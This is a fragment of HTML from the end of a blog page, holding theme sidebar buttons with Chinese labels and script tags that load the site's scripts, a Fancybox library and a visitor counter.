title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
